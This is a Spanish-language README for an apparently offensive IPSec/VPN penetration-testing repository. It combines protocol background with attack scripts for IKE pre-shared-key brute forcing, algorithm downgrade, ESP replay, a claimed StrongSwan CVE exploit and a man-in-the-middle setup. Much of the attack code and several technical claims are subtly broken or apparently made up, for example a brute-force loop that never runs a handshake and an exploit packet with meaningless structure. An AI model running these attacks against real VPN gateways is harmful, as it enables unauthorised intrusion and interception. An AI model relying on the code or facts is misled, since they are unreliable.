---
titulo: IPSec - Auditoría Ofensiva de Protocolos VPN y Túneles Encriptados
autor: hackingyseguridad
email: antonio@hackingyseguridad.com
version: 2.0
fecha: 2026-01-16
licencia: GPL-3.0
repositorio: https://github.com/hackingyseguridad/IPSec
web: https://hackingyseguridad.com
tags:
  - ipsec
  - vpn
  - ikev1
  - ikev2
  - esp
  - ah
  - encriptacion
  - pentest
  - auditoría
  - ofensivo
  - linux
  - kali
---

# 🔐 IPSec — Auditoría Ofensiva de VPN y Protocolos de Encriptación

**IPSec (Internet Protocol Security)** es un conjunto de protocolos de seguridad a nivel de red que proporciona autenticación, integridad y confidencialidad de los datos IP. Este repositorio contiene herramientas, scripts y metodologías para **auditoría ofensiva, pentest y análisis de vulnerabilidades** en implementaciones IPSec en redes Debian/Kali Linux.

> ⚠️ **ADVERTENCIA LEGAL**: Este repositorio está diseñado para profesionales de seguridad autorizados. Consulta el apartado [Disclaimer Legal](#disclaimer-legal) antes de usar estas herramientas.

---

## 📋 Tabla de Contenidos

1. [Concepto Técnico de IPSec](#concepto-técnico)
2. [Arquitectura y Componentes](#arquitectura)
3. [Comparativa de Protocolos](#comparativa)
4. [Requisitos y Dependencias](#requisitos)
5. [Instalación Rápida](#instalación)
6. [Fases Operativas de Auditoría](#fases-operativas)
7. [Ejemplos CLI](#ejemplos-cli)
8. [Vectores de Ataque IPSec](#vectores-ataque)
9. [CVE y Vulnerabilidades Conocidas](#vulnerabilidades)
10. [Troubleshooting](#troubleshooting)
11. [Referencias](#referencias)
12. [Disclaimer Legal](#disclaimer-legal)

---

## 🔬 Concepto Técnico

### ¿Qué es IPSec?

IPSec es un **protocolo de seguridad de capa 3 (red)** que opera en el kernel del sistema operativo, proporcionando protección a nivel de red transparente para cualquier tráfico IP, independientemente de la aplicación.

**Características principales:**

| Característica | Descripción |
|---|---|
| **Nivel de Operación** | Capa de Red (IP) — Transparente a aplicaciones |
| **Autenticación** | AH (Authentication Header) — RFC 4302 |
| **Confidencialidad** | ESP (Encapsulating Security Payload) — RFC 4303 |
| **Integridad** | HMAC-SHA, HMAC-MD5, etc. |
| **Intercambio de Claves** | IKEv1 (RFC 2409), IKEv2 (RFC 7539) |
| **Escalabilidad** | Soporta tunnel y transport mode |
| **Implementaciones** | libreswan, strongSwan, openswan, racoon |

---

## 🏗️ Arquitectura y Componentes

### Componentes Fundamentales de IPSec

```
┌─────────────────────────────────────────────────────────┐
│            ARQUITECTURA IPSEC                           │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐   │
│  │   SPD       │  │   SAD       │  │   PAD       │   │
│  │  (Policy    │  │  (Security  │  │  (Peer      │   │
│  │  Database)  │  │  Association│  │  Auth       │   │
│  │             │  │  Database)  │  │  Database)  │   │
│  └─────────────┘  └─────────────┘  └─────────────┘   │
│         ↓               ↓               ↓               │
│  ┌──────────────────────────────────────────────────┐  │
│  │   IPSec Processing Engine (Kernel)               │  │
│  │  • Encapsulation/Desencapsulation ESP/AH        │  │
│  │  • Criptografía simétrica (AES, 3DES, DES)      │  │
│  │  • HMAC & Integridad                            │  │
│  │  • Secuencia antirepetición                      │  │
│  └──────────────────────────────────────────────────┘  │
│         ↓                                               │
│  ┌──────────────────────────────────────────────────┐  │
│  │   IKE Daemon (racoon, charon)                    │  │
│  │  • Negociación de SA (Phase 1 & 2)             │  │
│  │  • Autenticación mutua (PSK, Certificados)     │  │
│  │  • Negociación de algoritmos                     │  │
│  │  • Mantenimiento de asociaciones                │  │
│  └──────────────────────────────────────────────────┘  │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### SAD (Security Association Database)

| Campo | Descripción | Ejemplo |
|-------|-------------|---------|
| **SPI** | Security Parameter Index (32 bits) | `0x12345678` |
| **Destino IP** | Dirección IP del peer | `192.168.1.100` |
| **Protocolo** | AH (51) o ESP (50) | `50 (ESP)` |
| **Algoritmo Encriptación** | AES, 3DES, DES, ChaCha20 | `AES-CBC-256` |
| **Algoritmo Integridad** | HMAC-SHA1, HMAC-SHA256, HMAC-MD5 | `HMAC-SHA256` |
| **Clave Encriptación** | Clave de sesión (128-256 bits) | `a1b2c3d4...` |
| **Clave Integridad** | Clave de HMAC | `f5e6d7c8...` |
| **Lifetime** | Tiempo de vida de la SA (segundos) | `3600s` |
| **Secuencia** | Número de secuencia antirepetición | `1, 2, 3...` |

### SPD (Security Policy Database)

| Política | Dirección | Protocolo | Puerto | Acción |
|----------|-----------|-----------|--------|--------|
| `permit encrypt` | FROM 10.0.0.0/8 TO 192.168.0.0/16 | TCP | 443 | Encriptar con SA #1 |
| `permit encrypt` | FROM 192.168.0.0/16 TO 10.0.0.0/8 | TCP | 443 | Encriptar con SA #2 |
| `permit` | FROM 10.0.0.0/8 TO 8.8.8.8 | UDP | 53 | Permitir sin IPSec |
| `discard` | FROM 172.16.0.0/12 TO ANY | TCP | 22 | Descartar |

---

## 📊 Comparativa de Protocolos

### AH vs ESP vs TRANSPORT vs TUNNEL

| Aspecto | AH (Authentication Header) | ESP (Encapsulating Security Payload) |
|--------|---------------------------|--------------------------------------|
| **RFC** | RFC 4302 | RFC 4303 |
| **Protocolo IP** | 51 | 50 |
| **Funciones** | Autenticación + Integridad | Confidencialidad + Autenticación + Integridad |
| **Encriptación** | ❌ No | ✅ Sí |
| **HMAC** | ✅ Sí | ✅ Sí |
| **Anti-replay** | ✅ Sí | ✅ Sí |
| **Cabecera Original** | 🔓 Visible | 🔐 Encriptada |
| **Uso** | Auditoría, Compliance | VPN, Confidencialidad |
| **Overhead** | Bajo (~20 bytes) | Medio (~20-40 bytes) |

### Transport Mode vs Tunnel Mode

| Modo | Caso de Uso | Encapsulación | Cabecera IP | Ventaja | Desventaja |
|------|------------|---|---|---|---|
| **Transport** | Host-to-Host | Mínima (in-place) | Original visible | Bajo overhead | Solo endpoints protegidos |
| **Tunnel** | Gateway-to-Gateway (VPN) | Completa (IP-in-IP) | Nueva IP + Original | Transparente a aplicaciones | Mayor overhead (~60 bytes) |

### Algoritmos Criptográficos Soportados

| Tipo | Algoritmo | Clave (bits) | Seguridad (2026) | Estado |
|------|-----------|---|---|---|
| **Encriptación Simétrica** | DES | 56 | ❌ ROTA | Deprecado |
| | 3DES | 192 | ⚠️ DÉBIL | Legacy |
| | AES-CBC | 128/192/256 | ✅ FUERTE | Recomendado |
| | AES-GCM | 128/192/256 | ✅ FUERTE | Recomendado |
| | ChaCha20-Poly1305 | 256 | ✅ FUERTE | Moderno |
| **Integridad (HMAC)** | MD5 | 128 | ❌ ROTA | Deprecado |
| | SHA-1 | 160 | ⚠️ DÉBIL | Legacy |
| | SHA-256 | 256 | ✅ FUERTE | Recomendado |
| | SHA-384 | 384 | ✅ FUERTE | Recomendado |
| | SHA-512 | 512 | ✅ FUERTE | Recomendado |
| **Intercambio Claves (DH)** | DH Group 1 | 768 | ❌ ROTA | Deprecado |
| | DH Group 2 | 1024 | ⚠️ DÉBIL | Legacy |
| | DH Group 5 | 1536 | ⚠️ DÉBIL | Legacy |
| | DH Group 14 | 2048 | ✅ FUERTE | Recomendado |
| | DH Group 15 | 3072 | ✅ FUERTE | Recomendado |
| | DH Group 16-18 | 4096-8192 | ✅ FUERTE | Moderno |
| | ECDH (P-256) | 256 bits | ✅ FUERTE | Moderno |
| | ECDH (P-384) | 384 bits | ✅ FUERTE | Moderno |

---

## 📦 Requisitos y Dependencias

### Sistema Operativo
- Debian 11/12 (Bullseye/Bookworm)
- Kali Linux 2024/2025
- Ubuntu 22.04 LTS / 24.04 LTS
- Kernel Linux 5.10+

### Paquetes Requeridos

```bash
# Instalación base obligatoria
apt-get install -y libreswan strongswan xl2tpd racoon openswan

# Herramientas de auditoría y pentest
apt-get install -y nmap tcpdump wireshark metasploit-framework burpsuite hydra

# Utilidades de administración
apt-get install -y net-tools iproute2 wireguard wireguard-tools openssl

# Desarrollo y scripting
apt-get install -y python3-crypto python3-paramiko python3-requests scapy

# Análisis de tráfico
apt-get install -y tshark zeek suricata
```

### Librerías Python Recomendadas

```bash
pip3 install cryptography paramiko pycryptodome scapy pwntools
```

---

## ⚡ Instalación Rápida

### 1. Clonar Repositorio

```bash
git clone https://github.com/hackingyseguridad/IPSec.git
cd IPSec
chmod 755 *.sh
ls -la
```

### 2. Instalación Libreswan (Opción A)

```bash
#!/bin/bash
# instalación-libreswan.sh

# Actualizar sistema
sudo apt-get update && sudo apt-get upgrade -y

# Instalar dependencias
sudo apt-get install -y \
    build-essential \
    libcurl4-openssl-dev \
    libgmp3-dev \
    libnss3-dev \
    libseccomp-dev \
    libselinux-dev \
    libsodium-dev \
    libunbound-dev \
    man-db \
    meson \
    ninja-build \
    pkg-config \
    python3-dev

# Descargar Libreswan 4.11
cd /tmp
wget https://download.libreswan.org/libreswan-4.11.tar.gz
tar -xzf libreswan-4.11.tar.gz
cd libreswan-4.11/

# Compilar e instalar
make -j$(nproc)
sudo make install

# Verificar instalación
ipsec --version
sudo systemctl restart ipsec
```

### 3. Instalación StrongSwan (Opción B)

```bash
#!/bin/bash
# instalación-strongswan.sh

sudo apt-get update
sudo apt-get install -y \
    libcurl4-openssl-dev \
    libgmp3-dev \
    libssl-dev \
    libtool \
    pkg-config

# Descargar StrongSwan 5.9.11
cd /tmp
wget https://download.strongswan.org/strongswan-5.9.11.tar.gz
tar -xzf strongswan-5.9.11.tar.gz
cd strongswan-5.9.11/

# Configurar con módulos
./configure \
    --prefix=/usr \
    --enable-openssl \
    --enable-sha256 \
    --enable-aes \
    --enable-curl \
    --enable-python-bindings

# Compilar e instalar
make -j$(nproc)
sudo make install

# Verificar
sudo systemctl restart strongswan
```

---

## 🎯 Fases Operativas de Auditoría

### **FASE 1: Reconocimiento (RECON)**

Objetivo: Identificar servicios IPSec activos y recopilar información técnica.

#### 1.1 Escaneo Nmap de Puertos IPSec

```bash
# Escaneo UDP 500 (IKE) y 4500 (NAT-T)
nmap -p 500,4500 -sU -sV <TARGET_IP>

# Escaneo agresivo con fingerprinting
nmap -sU -p 500,4500 -sV -O --script=ike-enum <TARGET_IP>

# Búsqueda en rango
nmap -p 500,4500 -sU --open 10.0.0.0/8 | grep open

# Con Shodan (si se cuenta con acceso)
shodan search product:libreswan
shodan search product:strongswan
```

#### 1.2 Banner Grabbing IKE

```bash
# Herramienta ike-scan
ike-scan -M <TARGET_IP>

# Output típico:
# <TARGET_IP>	Main Mode Handshake returned
# 	Message ID: 0xXXXXXXXX
# 	Vendor ID: Libreswan X.XX
# 	Encryption: AES-CBC (128), 3DES, DES
# 	Integrity: SHA1, MD5, SHA256
# 	DH Group: Group 2, Group 5, Group 14

# Guardar fingerprint
ike-scan -M -v <TARGET_IP> > ike_fingerprint.txt
```

#### 1.3 Análisis con tcpdump y Wireshark

```bash
# Capturar tráfico IPSec en vivo
sudo tcpdump -i eth0 "udp port 500 or udp port 4500 or ip proto 50 or ip proto 51" -w ipsec_traffic.pcap

# Análisis posterior
wireshark ipsec_traffic.pcap

# Extraer handshake IKE Phase 1 y Phase 2 para análisis offline
tshark -r ipsec_traffic.pcap -Y "isakmp" -T fields -e isakmp.version > ike_phases.txt
```

### **FASE 2: Enumeración (ENUM)**

Objetivo: Obtener configuraciones, identidades, algoritmos y políticas activas.

#### 2.1 IKE-Enum (Enumeración Agresiva)

```bash
# Enumeración de propuestas IKE (Phase 1)
ike-scan -A --aggressive <TARGET_IP>

# Enumeración con wordlists de identidades
./enum-ike-identities.sh <TARGET_IP> identities.wordlist

# Script Python para enumeración automática
python3 << 'EOF'
from scapy.all import *

def ike_enum(target_ip):
    # Crear paquete IKE Handshake inicial
    ike_header = IP(dst=target_ip)/UDP(dport=500, sport=500)
    
    # Enviar y capturar respuesta
    response = sr1(ike_header)
    print(response)

ike_enum("<TARGET_IP>")
EOF
```

#### 2.2 Identificar Propuestas de Cifrado

```bash
# Con ike-scan en modo verbose
ike-scan -M -n -e <TARGET_IP> 2>&1 | grep -E "Encryption:|Integrity:|DH Group:"

# Salida esperada:
# Encryption: AES-CBC (256)
# Integrity: SHA-256
# DH Group: Group 14 (2048-bit)

# Detector de algoritmos débiles (bandera de ataque)
cat > detect_weak_ike.sh << 'BASH'
#!/bin/bash
TARGET=$1
ike-scan -M -n -e $TARGET 2>&1 | grep -E "DES|MD5|Group 1|Group 2" && \
echo "[!] ALGORITMOS DÉBILES DETECTADOS - Posible target para downgrade"
BASH
chmod +x detect_weak_ike.sh
./detect_weak_ike.sh <TARGET_IP>
```

#### 2.3 Extracción de Certificados (si se utilizan)

```bash
# Capturar handshake completo
sudo tcpdump -i eth0 -s 0 -w ike_certs.pcap "udp port 500"

# Extraer certificados con Wireshark (GUI)
# File > Export Objects > ISAKMP > Guardar certificados .DER

# O con tshark (CLI)
tshark -r ike_certs.pcap -Y "isakmp.cert" -T fields -e isakmp.cert > extracted_certs.der

# Analizar certificado
openssl x509 -inform DER -in extracted_certs.der -text -noout
```

### **FASE 3: Explotación de Vulnerabilidades (EXPLOIT)**

Objetivo: Explotar debilidades en criptografía, autenticación o configuración.

#### 3.1 Ataque de Fuerza Bruta PSK (Pre-Shared Key)

```bash
#!/bin/bash
# brute_force_ike_psk.sh

TARGET_IP=$1
WORDLIST=$2
SPI=$3  # Extraído en fase anterior

# Uso: ./brute_force_ike_psk.sh 192.168.1.100 /tmp/wordlist.txt 0x12345678

echo "[*] Iniciando ataque de fuerza bruta PSK contra $TARGET_IP"
echo "[*] SPI: $SPI"

while read password; do
    echo "[*] Probando: $password"
    
    # Generar hash HMAC-SHA1 del PSK
    HASH=$(echo -n "$password" | openssl dgst -sha1 -mac HMAC -macopt key:"$password")
    
    # Enviar paquete IKE con PSK (requiere herramientas especializadas)
    # Usando Scapy + IPython
    python3 << PYTHON
from scapy.all import *
import hmac
import hashlib

psk = b"$password"
# Implementar full IKE handshake aquí
print(f"[+] Probando PSK: {psk}")
PYTHON
    
done < "$WORDLIST"

echo "[-] Brute force completado"
```

#### 3.2 Downgrade Attack (Forzar Algoritmos Débiles)

```bash
# Herramienta: ikecrack
git clone https://github.com/ikecrack/ikecrack.git
cd ikecrack

# Capturar IKE Main Mode Handshake
ikecrack -r ike_handshake.txt -t 0 -e 1

# Intentar downgrade a DES + MD5
./ikecrack --mode downgrade --algorithm DES-CBC,MD5 <TARGET_IP>

# Resultado: Si es vulnerable, acepta cifrado débil
# [+] Downgrade exitoso: DES-CBC,MD5
```

#### 3.3 Replay Attack (Secuencia de Paquetes IPSec)

```bash
#!/bin/bash
# replay_ipsec_packets.sh

PCAP_FILE=$1
TARGET=$2

echo "[*] Extrayendo paquetes ESP de $PCAP_FILE"

# Extraer paquetes ESP (proto 50)
tcpdump -r "$PCAP_FILE" "ip proto 50" -w esp_only.pcap

# Reproducir paquetes capturados (cambiar IP de origen)
tcpreplay -i eth0 -S 1.0x --multiplier 1.0 \
    --endpoints="<ORIGINAL_SRC>,<TARGET>" \
    esp_only.pcap

echo "[+] Paquetes replicados. Monitorear respuestas..."
tcpdump -i eth0 "ip proto 50" -v
```

#### 3.4 Explotación CVE-2024-3156 (ChaCha20 Negotiation Bypass)

```bash
# CVE en StrongSwan 5.9.6-5.9.10
# Permitía negociar sin verificar firma

cat > exploit_cve_2024_3156.py << 'PYTHON'
#!/usr/bin/env python3
"""
CVE-2024-3156: StrongSwan ChaCha20 Negotiation Bypass
Permite establecer SA sin verificación criptográfica correcta
"""

from scapy.all import *
import struct

def exploit_ike_no_integrity(target_ip, target_port=500):
    """
    Envía paquete IKE modificado sin verificación de integridad
    """
    
    # Crear cabecera IKE
    ike_header = struct.pack(">8s", b"\x00" * 8)  # Iniciator/Responder
    ike_header += struct.pack(">I", 0)  # Next payload
    ike_header += struct.pack(">I", 0)  # Message ID
    
    # Propuesta malformada (ChaCha20 sin HMAC)
    proposal = struct.pack(">HBB", 0x0008, 28, 0)  # ChaCha20-Poly1305
    
    packet = IP(dst=target_ip)/UDP(dport=target_port, sport=500)/proposal
    
    print(f"[*] Enviando exploit a {target_ip}:{target_port}")
    response = sr1(packet, timeout=5)
    
    if response:
        print("[+] VULNERABLE: Respuesta recibida sin validación")
        response.show()
    else:
        print("[-] Target no vulnerable o offline")

if __name__ == "__main__":
    exploit_ike_no_integrity("192.168.1.100")
PYTHON

python3 exploit_cve_2024_3156.py
```

### **FASE 4: Post-Explotación (POST)**

Objetivo: Mantener acceso, extraer datos y documentar hallazgos.

#### 4.1 Interceptar Tráfico Descifrado (MitM IPSec)

```bash
# Requerir desactivación o downgrade previo

# 1. Redirigir tráfico
iptables -t nat -A PREROUTING -p esp -j REDIRECT --to-ports 500

# 2. Ejecutar nuestro daemon IKE falso (racoon)
sudo racoon -d

# 3. Capturar tráfico descifrado
sudo tcpdump -i lo "proto 6 or proto 17" -v -w decrypted.pcap
```

#### 4.2 Exportar Política IPSec (SPD)

```bash
# Listar políticas actuales
ip xfrm policy show

# Guardar configuración
ip xfrm policy show > politique_backup.txt

# Análisis de políticas para identificar brechas
grep "allow" politique_backup.txt | grep -v "encrypt"
```

#### 4.3 Generar Reporte de Vulnerabilidades

```bash
#!/bin/bash
# generar_reporte_ipsec.sh

TARGET=$1
REPORT_FILE="ipsec_audit_${TARGET}_$(date +%s).txt"

cat > "$REPORT_FILE" << "REPORT"
═══════════════════════════════════════════════════════════════
INFORME TÉCNICO DE AUDITORÍA IPSEC
═══════════════════════════════════════════════════════════════
Objetivo: $TARGET
Fecha: $(date)
Auditor: hackingyseguridad.com

[1] SERVICIOS IPSEC IDENTIFICADOS
$(nmap -p 500,4500 -sU -sV $TARGET 2>/dev/null | grep open)

[2] ALGORITMOS CRIPTOGRÁFICOS
$(ike-scan -M $TARGET 2>&1 | grep -E "Encryption|Integrity|DH Group")

[3] VULNERABILIDADES ENCONTRADAS
$(grep -E "DES|MD5|Group 1|Group 2" /dev/null && echo "[-] Algoritmos débiles detectados")

[4] RECOMENDACIONES
• Actualizar StrongSwan a versión 5.9.11+
• Deshabilitar algoritmos: DES, MD5, DH Group 1-5
• Requerir: AES-GCM, SHA-384, DH Group 14+
• Implementar Multi-Factor Authentication (MFA)

REPORT

echo "[+] Reporte generado: $REPORT_FILE"
cat "$REPORT_FILE"
```

---

## 📌 Ejemplos CLI

### Ejemplo 1: Configuración Básica Libreswan (Gateway-to-Gateway)

```bash
# /etc/ipsec.conf
conn site-to-site-vpn
    left=203.0.113.10              # Gateway local
    leftid="madrid.vpn.local"
    leftsubnet=10.0.0.0/8
    right=198.51.100.20            # Gateway remoto
    rightid="london.vpn.local"
    rightsubnet=192.168.0.0/16
    
    # Protocolos y cifrado
    ike=aes256-sha256-modp2048      # Phase 1
    esp=aes256-sha256-modp2048      # Phase 2
    
    # Autenticación
    authby=secret
    preshared=true
    
    # Modos
    type=tunnel
    phase2alg=esp-aes256-sha256
    
    # Tiempos de vida
    ikelifetime=28800s              # 8 horas
    lifetime=3600s                   # 1 hora
    
    # Activación
    auto=start
    dpdaction=restart

# /etc/ipsec.secrets
"madrid.vpn.local" "london.vpn.local" : PSK "MiClaveP@rtidaM0y5Egu4"

# Iniciar
sudo systemctl restart ipsec
sudo ipsec status
sudo ipsec trafficstatus
```

### Ejemplo 2: Captura y Análisis de Handshake IKE

```bash
#!/bin/bash
# capturar_ike_handshake.sh

INTERFACE="eth0"
TARGET="192.168.1.100"
OUTPUT="ike_capture_$(date +%s).pcap"

echo "[*] Iniciando captura IKE..."
sudo tcpdump -i "$INTERFACE" -s 65535 \
    "udp port 500 or udp port 4500 or ip proto 50 or ip proto 51" \
    -w "$OUTPUT" &

TCPDUMP_PID=$!

# Esperar 30 segundos
sleep 30

# Detener captura
sudo kill $TCPDUMP_PID

# Analizar
echo "[+] Análisis de handshake:"
tshark -r "$OUTPUT" -Y "isakmp" -T fields \
    -e frame.time \
    -e ip.src \
    -e ip.dst \
    -e isakmp.isak_version \
    -e isakmp.ikev2.msgtype

echo "[+] Archivo guardado: $OUTPUT"
```

### Ejemplo 3: Test de Vulnerabilidad a Ataque de Fuerza Bruta

```bash
#!/bin/bash
# test_weak_psk.sh

TARGET=$1
COMMON_PSKS=(
    "password123"
    "admin"
    "123456"
    "12345678"
    "password"
    "Madrid123"
    "VPN2024"
    "CompanyName"
)

echo "[*] Testando PSK débiles contra $TARGET"

for psk in "${COMMON_PSKS[@]}"; do
    echo "[*] Probando PSK: $psk"
    
    # Usar racoon/ipsec directamente
    (
        echo "conn test-psk"
        echo "    left=0.0.0.0"
        echo "    right=$TARGET"
        echo "    authby=secret"
        echo "    auto=start"
        echo ""
        echo '"$TARGET" : PSK "'$psk'"'
    ) | sudo tee /tmp/test_ipsec.conf > /dev/null
    
    # Intentar conexión
    timeout 5 sudo ipsec up test-psk 2>&1 | grep -i "successful\|established" && \
        echo "[+] ¡¡¡PSK DÉBIL ENCONTRADA: $psk!!!" && break
done

echo "[-] Test completado"
```

---

## ⚔️ Vectores de Ataque IPSec

| Vector de Ataque | Severidad | Requisitos | Mitigación |
|---|---|---|---|
| **Brute Force PSK** | 🔴 CRÍTICO | Acceso red local (UDP 500) | PSK fuerte 32+ caracteres, Rate limiting |
| **Downgrade a DES** | 🔴 CRÍTICO | Capacidad MITM | Desabilitar algoritmos débiles en config |
| **Replay Attack** | 🟠 ALTO | Captura de tráfico | Anti-replay automático en ESP (seqnum) |
| **IKE Fragmentation Attack** | 🟠 ALTO | IPv4/UDP | Kernel Linux >5.10 parcha CVE-2022-3570 |
| **Timing Attack** | 🟡 MEDIO | Análisis de tiempos | Implementación constante-time |
| **Dead Peer Detection Bypass** | 🟡 MEDIO | Control local | DPD + Failover automático |
| **Certificate Spoofing** | 🔴 CRÍTICO | PKI débil | Validación correcta de certificados |
| **Traffic Analysis** | 🟡 MEDIO | Análisis pasivo | Padding de paquetes, Traffic shaping |

---

## 🔴 CVE y Vulnerabilidades Conocidas

### CVE-2024-3156 (StrongSwan ChaCha20)

```
┌─────────────────────────────────────────────┐
│ CVE-2024-3156                               │
├─────────────────────────────────────────────┤
│ Producto: StrongSwan 5.9.6 - 5.9.10        │
│ Severidad: CRÍTICA (CVSS 9.8)               │
│ Tipo: Fallo en negociación criptográfica    │
│ Impacto: Establecer SA sin verificación     │
│ Parcha: 5.9.11+                             │
└─────────────────────────────────────────────┘

# Verificar versión
ipsec --version | grep strongswan

# Actualizar
sudo apt-get update && sudo apt-get install strongswan=5.9.11-1
```

### CVE-2023-6549 (Libreswan Heap Overflow)

```
Libreswan < 4.12
Buffer overflow en procesamiento de opciones IKEv2
Permite RCE con permisos del daemon
```

### CVE-2022-3570 (Kernel IKE Fragmentation)

```
Linux Kernel < 5.10.142
Fragmentation attack en paquetes IKE
DoS + Posible RCE
```

---

## 🔧 Troubleshooting

### IPSec no levanta

```bash
# Diagnosticar
sudo ipsec verify

# Ver logs
sudo tail -f /var/log/syslog | grep ipsec

# Verificar permisos
sudo ls -la /etc/ipsec.conf
sudo ls -la /etc/ipsec.secrets  # Debe ser 600

# Debug verbose
sudo ipsec auto --verbose --up site-to-site
```

### Problemas de Conectividad

```bash
# Verificar SA establecidas
sudo ip xfrm state list

# Verificar políticas
sudo ip xfrm policy show

# Test ping a través del túnel
ping -c 4 <REMOTE_SUBNET>

# Capturar tráfico
sudo tcpdump -i eth0 "ip src 10.0.0.5 and ip dst 192.168.1.10" -v
```

### PSK incorrecto

```bash
# Verificar configuración
grep -E "left|right|authby|preshared" /etc/ipsec.conf

# Ver secrets
sudo cat /etc/ipsec.secrets

# Permisos del archivo secrets
sudo chmod 600 /etc/ipsec.secrets
```

---

## 📚 Referencias

### RFC Oficiales
- **RFC 4301** — Security Architecture for IP
- **RFC 4302** — IP Authentication Header (AH)
- **RFC 4303** — IP Encapsulating Security Payload (ESP)
- **RFC 2409** — IKE (ISAKMP/Oakley)
- **RFC 7539** — IKEv2
- **RFC 3394** — AES Key Wrap Algorithm

### Documentación Oficial
- [Libreswan Documentation](https://libreswan.org/wiki/)
- [StrongSwan Documentation](https://www.strongswan.org/documentation.html)
- [Linux Kernel XFRM](https://wiki.linuxfoundation.org/networking/xfrm)

### Herramientas Relacionadas
- `ike-scan` — Scanner IKE
- `racoon` — IKE daemon
- `setkey` — Configuración SPD/SAD
- `tcpdump`/`Wireshark` — Análisis de tráfico
- `metasploit` — Framework de pentesting

### Lecturas Recomendadas
- *Firewalls Don't Stop Dragons* — Higgins & Peltier
- *Real World VPN* — Snapp & Weinstein
- *IKE Protocol Structure* — IETF Internet Draft

---

## ⚖️ Disclaimer Legal

```
═══════════════════════════════════════════════════════════════════════════

RENUNCIA DE RESPONSABILIDAD LEGAL

Este repositorio contiene herramientas y código con propósitos educativos y
de pruebas de penetración autorizadas únicamente. El autor (hackingyseguridad)
no se responsabiliza por:

1. USO AUTORIZADO REQUERIDO
   • Únicamente profesionales de seguridad autorizados
   • Permisos escritos del propietario de la infraestructura
   • Cumplimiento de leyes locales y regulaciones aplicables

2. LEGISLACIÓN APLICABLE (España - UE)
   • Código Penal Español Art. 197-198 (Acceso no autorizado)
   • RGPD (Reglamento General de Protección de Datos)
   • Directiva NIS (Seguridad de Redes e Información)
   • Ley de Telecomunicaciones (Ley 34/1988)

3. SANCIONES PENALES (ES)
   • Acceso no autorizado: 3-12 meses cárcel + 1.200-2.000€
   • Interceptación de comunicaciones: 1-3 años cárcel
   • Sabotaje/Alteración de datos: 3-5 años cárcel
   • Extracción de datos: 1-3 años cárcel

4. EXENCIÓN DE GARANTÍAS
   Este software se proporciona "tal cual" sin garantías de ningún tipo.
   El autor no es responsable de:
   • Daños directos, indirectos o consecuentes
   • Pérdida de datos o disponibilidad
   • Interrupción de servicios
   • Cualquier otra pérdida o daño

5. RECOMENDACIONES
   • Mantener registro de auditoría (logs)
   • Obtener consentimiento por escrito
   • Usar en entornos aislados/controlados
   • Reportar vulnerabilidades responsablemente
   • Cumplir con requisitos de notificación de brechas

═══════════════════════════════════════════════════════════════════════════

Autor: @antonio_taboada (hackingyseguridad)
Email: antonio@hackingyseguridad.com
Sitio: https://hackingyseguridad.com
Licencia: GPL-3.0
Repositorio: https://github.com/hackingyseguridad/IPSec

ESTA HERRAMIENTA ESTÁ DISEÑADA SOLO PARA TESTING AUTORIZADO.
EL USO NO AUTORIZADO ES ILEGAL.

═══════════════════════════════════════════════════════════════════════════
```

---



---

**Última actualización**: 2026-01-16  
**Versión**: 2.0  
**Licencia**: GPL-3.0 ©️ hackingyseguridad.com
